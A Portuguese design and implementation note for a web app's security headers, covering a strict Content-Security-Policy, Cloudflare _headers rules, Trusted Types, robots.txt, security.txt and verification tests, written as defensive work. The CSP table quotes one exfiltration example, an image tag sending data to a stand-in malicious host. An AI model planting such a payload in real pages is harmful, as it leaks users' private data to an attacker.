# Segurança web — cabeçalhos, CSP, robots.txt e security.txt

> **Estado (2026-11-26, F01):** implementado nos arquivos `app/public/_headers`, `site/public/_headers`, `robots.txt` e `.well-known/security.txt` das duas origens, mais `SECURITY.md` na raiz. Verificado localmente com `tooling/serve-static.js` + `curl -I` e com os testes `app/src/security-headers.test.ts`. **Falta verificar em produção** (seção "Pendências").

## Duas origens, duas políticas (ADR-0004)
| Origem | Conteúdo | Indexável? | Política |
|---|---|---|---|
| `https://<dominio>` (ex.: `papeai.com.br`) | Site institucional: apresentação, FAQ, privacidade, termos, página de exclusão de conta | **Sim** | CSP própria, **sem JavaScript** (hoje) |
| `https://app.<dominio>` | O aplicativo (cofre, sessão, conversas) | **Nunca** | CSP máxima, zero terceiros |

Por que separar: armazenamento do navegador (IndexedDB, localStorage) é **por origem**. Qualquer coisa que rode no site institucional não enxerga o cofre do app. Antes do domínio próprio, usamos dois subdomínios gratuitos do provedor de hospedagem.

## Como a Cloudflare lê o `_headers` (fontes verificadas em 2026-11-26)
Fontes oficiais: [Workers — Static Assets — Headers](https://developers.cloudflare.com/workers/static-assets/headers/) (página com `dateModified` 2026-11-12) e [Pages — Headers](https://developers.cloudflare.com/pages/configuration/headers/) (mesma sintaxe). Consultadas em 2026-11-26.

| Regra | O que a doc diz | Como usamos |
|---|---|---|
| Onde fica | Arquivo `_headers` (sem extensão) na pasta de assets; com framework, em `public/`, copiado para a saída do build. O próprio arquivo **não** é servido. | `app/public/_headers` e `site/public/_headers`; o Vite copia para `dist/` (conferido no build) |
| Formato | Linha sem recuo = caminho; linhas recuadas = `Nome: valor`; `#` = comentário (aparece nos exemplos) | Igual |
| Curinga | Um único `*` por caminho, casa qualquer coisa | `/*` e `/assets/*` |
| Várias regras casando | A requisição herda **todas**, na ordem do arquivo; o mesmo cabeçalho repetido é **juntado com vírgula** | Nenhum cabeçalho aparece em duas regras que casam o mesmo caminho (teste "never joins two values") |
| Remover | `! Nome` remove o que uma regra **anterior** adicionou | Não usamos (não precisou) |
| Limites | Até **100 regras**; **2.000 caracteres por linha** | App: 6 regras; site: 3; maior linha (CSP do app) ≈ 360 caracteres. O parser local recusa arquivos acima dos limites |
| Padrões | `Cache-Control` padrão dos assets: `public, max-age=0, must-revalidate`; `_headers` **substitui** o que a Cloudflare enviaria | Só definimos `Cache-Control` onde queremos outro valor |
| Respostas de Worker/Functions | O `_headers` **não** se aplica a respostas geradas por código (Worker, Pages Functions, SSR) | O app e o site são 100% estáticos. Se um dia houver Worker, os cabeçalhos terão de ser definidos nele |

**Não confirmado na doc:** se, no modo SPA (`not_found_handling: single-page-application` nos Workers), as regras são escolhidas pelo caminho pedido ou por `/index.html`. Por isso **todos** os cabeçalhos de segurança estão em `/*` — valem em qualquer caso. Só o `Cache-Control: no-cache` depende do caminho; numa rota profunda (ex.: `/configuracoes`) vale o padrão `max-age=0, must-revalidate`, que também obriga a revalidar. Confirmar com `curl -I` em produção.

Pages x Workers e o `wrangler` ficam com a tarefa de deploy (seção F da F01): o `_headers` funciona igual nos dois.

## Cabeçalhos do app (implementado em `app/public/_headers`)
```text
/*
  Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; media-src 'self'; worker-src 'self'; manifest-src 'self'; frame-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'; upgrade-insecure-requests
  Content-Security-Policy-Report-Only: require-trusted-types-for 'script'
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
  Permissions-Policy: microphone=(), camera=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=()
  Cross-Origin-Opener-Policy: same-origin
  Cross-Origin-Resource-Policy: same-origin
  X-Robots-Tag: noindex, nofollow, noarchive
/  e  /index.html  e  /sw.js
  Cache-Control: no-cache
/assets/*
  Cache-Control: public, max-age=31536000, immutable
/.well-known/security.txt
  Content-Type: text/plain; charset=utf-8
```
(Resumo; o arquivo real tem uma regra por caminho e comentários.)

### A CSP explicada linha a linha
| Diretiva | Valor | Por quê |
|---|---|---|
| `default-src` | `'none'` | Começa tudo bloqueado |
| `script-src` | `'self'` | Só scripts do próprio app. **Sem** `unsafe-inline`, **sem** `unsafe-eval`, **sem** CDNs. O `index.html` gerado só tem `<script src=...>` (o plugin de PWA está com `injectRegister: false`, sem script inline) |
| `style-src` | `'self'` | CSS compilado (Tailwind). Estilos aplicados via JS pelo React usam CSSOM e não exigem `unsafe-inline` |
| `img-src` | `'self' data:` | Bloqueia imagens externas — impede exfiltração via `<img src="https://malicioso/?dados=...">` |
| `font-src` | `'self'` | Fontes self-hosted (Inter/Nunito em `/assets/`) |
| `connect-src` | `'self'` | **A cerca da chave**: o navegador recusa enviar dados para qualquer outro lugar. Na F01 é só a própria origem, igual à allowlist `app/src/config/network.ts` (um teste exige que as duas listas sejam iguais) |
| `media-src` | `'self'` | Ainda não há áudio |
| `worker-src` | `'self'` | Service worker do PWA (`/sw.js`, que importa `/workbox-*.js`) |
| `manifest-src` | `'self'` | `/manifest.webmanifest` |
| `frame-src` / `frame-ancestors` | `'none'` | O app não embute nada e ninguém coloca o app num iframe (anti-clickjacking) |
| `base-uri` / `form-action` / `object-src` | `'none'` / `'self'` / `'none'` | Fecha truques clássicos de injeção |
| `upgrade-insecure-requests` | — | Qualquer `http://` vira `https://` |

**Diferenças em relação à versão de planejamento deste documento** (todas mais restritivas, decididas na F01 pelo princípio "só o que é usado hoje"):
- `connect-src` sem Anthropic e Supabase (entram na F02/F03, junto com a allowlist).
- `blob:` removido de `img-src`, `media-src` e `worker-src`; `microphone=(self)` virou `microphone=()`. Voltam quando a fase que precisa deles chegar (tabela abaixo).

### Trusted Types: modo "só relatar" (decisão da F01)
- **O que é:** com `require-trusted-types-for 'script'` em vigor, o navegador recusa strings comuns em pontos perigosos (ex.: `innerHTML`, `script.src`) e exige objetos criados por uma "política" aprovada. Fontes: [MDN — Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API) (modificada em 2026-05-14; recurso *Baseline 2026*) e [W3C — Trusted Types (Editor's Draft de 2026-11-18)](https://w3c.github.io/trusted-types/dist/spec/), consultadas em 2026-11-26.
- **Por que não ativar já:** a MDN lista `ServiceWorkerContainer.register()` como ponto que exige `TrustedScriptURL`. O registro do PWA (`workbox-window`) passa uma string comum, então **ativar agora quebraria o PWA**. Confirmado no navegador: com o modo "só relatar", o console mostra exatamente essa violação (`require-trusted-types-for -> trusted-types-sink (report-only)`) e mais nenhuma.
- **O que fizemos:** cabeçalho separado `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'`. Ele não bloqueia nada, só registra violações no console do navegador (não há endpoint de relatório — não queremos mandar dados a terceiros).
- **Para ativar (tarefa futura, com ADR):** criar uma política nomeada mínima só para a URL do service worker (ou um `default` restrito a `/sw.js`), confirmar zero violações e mover a diretiva para a CSP principal com `trusted-types <nome-da-politica>`.

### Ajustes previstos (cada um exige registro na ADR correspondente)
| Fase | Ajuste | Motivo |
|---|---|---|
| F02 | `connect-src` + `https://<PROJETO>.supabase.co wss://<PROJETO>.supabase.co` | Login e dados |
| F03 | `connect-src` + `https://api.anthropic.com` | Tutor (direto do aparelho) |
| F07 | `script-src 'self' 'wasm-unsafe-eval'` | Executar modelos de voz em WebAssembly no aparelho |
| F07 | `connect-src` + domínio do provedor de voz BYOK escolhido | Voz em nuvem opcional |
| F07 | `microphone=(self)`; `blob:` em `media-src`/`worker-src` (e `img-src`, se precisar) | Gravar e tocar áudio local; workers de áudio |
| F07 | `Cross-Origin-Embedder-Policy: require-corp` (avaliar) | Habilita `SharedArrayBuffer` (WASM multithread, mais rápido) |
| A definir | Trusted Types em vigor (ver acima) | Bloqueia injeção de HTML por strings |

### Regras de código que sustentam a CSP
- Proibido `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`, `document.write` (regras de lint).
- Texto vindo da IA: renderizado como texto ou com Markdown **restrito** (negrito, itálico, listas, código), **sem HTML bruto**, **sem imagens**; links exibidos como texto (não clicáveis) ou com confirmação explícita.
- Fontes **self-hosted** — nada de Google Fonts por link.
- Nenhum script de terceiros: sem analytics, sem widgets, sem chat de suporte embutido.

## Cabeçalhos do site institucional (implementado em `site/public/_headers`)
O site provisório **não tem nenhum JavaScript** (`site/index.html` só tem HTML + CSS), então a CSP é ainda mais fechada:
```text
default-src 'none'; script-src 'none'; style-src 'self'; img-src 'self' data:; connect-src 'self'; frame-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'; object-src 'none'; upgrade-insecure-requests
```
- `script-src 'none'` e `form-action 'none'` (não há scripts nem formulários). Se um dia o site precisar de JS, troca para `'self'` com ADR.
- Sem `font-src` (o site usa fontes do sistema; `default-src 'none'` bloqueia o resto).
- Demais cabeçalhos iguais aos do app (HSTS, `nosniff`, `no-referrer`, `Permissions-Policy` toda negada, COOP/CORP `same-origin`), **sem** `X-Robots-Tag` (o site é indexável) e com `/assets/*` imutável.

## robots.txt
> ⚠️ **robots.txt não é segurança.** É um arquivo **público** que *pede* a robôs bem-comportados para não indexar certas páginas. Qualquer pessoa pode lê-lo. Por isso: (1) nunca listar caminhos "secretos" nele; (2) a proteção real das áreas internas é login + RLS.

**App (`app/public/robots.txt`)** — nada é indexado:
```text
User-agent: *
Disallow: /
```
+ cabeçalho `X-Robots-Tag: noindex, nofollow, noarchive` + `<meta name="robots" content="noindex, nofollow">` no `app/index.html` (cinto e suspensório: o `noindex` vale mesmo se alguém linkar o app).

**Site institucional (`site/public/robots.txt`)**:
```text
User-agent: *
Allow: /
```
A linha `Sitemap: https://<dominio>/sitemap.xml` entra quando houver domínio e sitemap.
Opcional (Q-19): bloquear robôs de treinamento de IA no site, adicionando blocos `User-agent: <robô>` + `Disallow: /`.

## security.txt (`/.well-known/security.txt` nas duas origens)
Fonte: [RFC 9116](https://www.rfc-editor.org/rfc/rfc9116.html), consultada em 2026-11-26. Obrigatórios: `Contact` (URI; se web, `https://`) e `Expires` (uma única vez, formato RFC 3339; recomendado **menos de 1 ano** à frente). Servido por HTTPS como `text/plain; charset=utf-8` (garantido pela regra no `_headers`).
```text
Contact: https://github.com/daniel053/PapeAI/security/advisories/new
Expires: 2027-11-25T23:59:59Z
Preferred-Languages: pt, en
Policy: https://github.com/daniel053/PapeAI/blob/main/SECURITY.md
```
- Contato pelo recurso de **relato privado de vulnerabilidades** do GitHub (sem expor e-mail pessoal). O dono precisa **ativá-lo** no repositório: Settings → Advanced Security → Private vulnerability reporting → Enable ([docs do GitHub](https://docs.github.com/en/code-security/security-advisories/working-with-repository-security-advisories/configuring-private-vulnerability-reporting-for-a-repository), consultada em 2026-11-26). A doc do GitHub mostra o caminho pela aba *Security* → *Report a vulnerability*, mas não documenta a URL direta `/security/advisories/new`; conferir que ela abre o formulário depois de ativar.
- **Renovação:** o teste `security.txt ... has exactly one Expires` falha quando a data já passou ou se alguém puser mais de 1 ano à frente. Renovar antes de 2027-11-25.
- **Pendente:** `Canonical: https://app.<dominio>/.well-known/security.txt` (e a do site) quando houver domínio próprio; assinatura OpenPGP (recomendada pela RFC, opcional) — avaliar na F11.

## Service worker (PWA)
- Escopo restrito ao app; atualização com aviso "nova versão disponível".
- Cacheia **só arquivos estáticos**. Nunca cacheia respostas autenticadas do Supabase nem chamadas à IA.
- `/sw.js` com `Cache-Control: no-cache`, para a versão nova ser encontrada logo.

## CORS das Edge Functions
- `Access-Control-Allow-Origin` só para as origens do app (dev e prod). Nunca `*` em função que usa JWT.

## Verificação local (F01)
- **Servidor local:** `pnpm build` e depois `pnpm preview:app` (porta 4173, com fallback de SPA) ou `pnpm preview:site` (porta 4174). O `tooling/serve-static.js` (Node puro, sem dependências, só em `127.0.0.1`) aplica as regras do `_headers` usando o mesmo subconjunto de sintaxe descrito acima (`tooling/headers-file.js`). Em outro terminal: `curl -I http://127.0.0.1:4173/`.
- **Testes (Vitest, Node):** `app/src/security-headers.test.ts` — precursor do teste crítico `e2e.csp-blocks`. Confere: CSP sem `unsafe-*`, sem curingas e sem domínios externos; `default-src`/`object-src`/`base-uri`/`frame-ancestors` `'none'`; `connect-src 'self'` igual à allowlist; `worker-src`/`manifest-src`; Trusted Types em modo relatório; `X-Robots-Tag` em todo caminho do app e ausente no site; HSTS, `nosniff`, `Referrer-Policy`, COOP/CORP; cache; meta `robots` e ausência de script inline no `index.html`; site sem `<script>`; `robots.txt`; campos e validade do `security.txt`; o parser e os limites da Cloudflare; e o servidor local (cabeçalhos, fallback de SPA, não serve `_headers`, não sai da pasta, recusa `POST`).
- **No navegador (painel do Claude, 2026-11-26, app servido localmente):** o app abriu sem nenhuma violação da CSP em vigor. Teste de injeção pelo console: script inline **bloqueado** (`script-src-elem`), `fetch('https://example.com')` **bloqueado** (`connect-src`), imagem externa **bloqueada** (`img-src`). (O `eval` digitado pelo console das ferramentas de desenvolvedor não é bloqueado — o console é isento da CSP; no código do app, `eval` é bloqueado pela CSP e pelo lint.) O registro do service worker falhou **também sem nenhum cabeçalho** (teste de controle), então é limitação do navegador embutido, não da CSP: confirmar a instalação do PWA no celular/Chrome.

## Como verificar em produção (em todo portão que mexe em hospedagem)
- [ ] Scanner público de cabeçalhos (ex.: Mozilla HTTP Observatory, securityheaders.com) com nota máxima ou justificativa.
- [ ] Avaliador de CSP (ex.: CSP Evaluator) sem alertas altos.
- [ ] Teste E2E `e2e.csp-blocks` passando (versão com navegador chega com o Playwright).
- [ ] `curl -I` mostrando os cabeçalhos em produção (saída colada no relatório do portão), incluindo uma rota profunda do app (ex.: `/qualquer/rota`) para confirmar CSP e `X-Robots-Tag` no fallback de SPA.
- [ ] `robots.txt` e `X-Robots-Tag` corretos nas duas origens; `/.well-known/security.txt` como `text/plain; charset=utf-8`.
- [ ] Conferir que a Cloudflare não acrescenta cabeçalhos que conflitem (ex.: `Access-Control-Allow-Origin`) e que `/_headers` não é servido.

## Pendências (fora do alcance local)
| Item | Quando |
|---|---|
| `curl -I` e scanner nas URLs reais das duas origens | Deploy da F01 (seção F) |
| Confirmar comportamento do `_headers` no fallback de SPA | Deploy da F01 |
| Ativar relato privado de vulnerabilidades no GitHub e testar o link do `Contact` | Dono, antes do portão F01 |
| `Canonical` no `security.txt` e `Sitemap` no `robots.txt` do site | Quando houver domínio próprio |
| Trusted Types em vigor | Tarefa própria, com ADR |
| HSTS `preload` | Só com domínio próprio e decisão explícita (difícil de desfazer) |
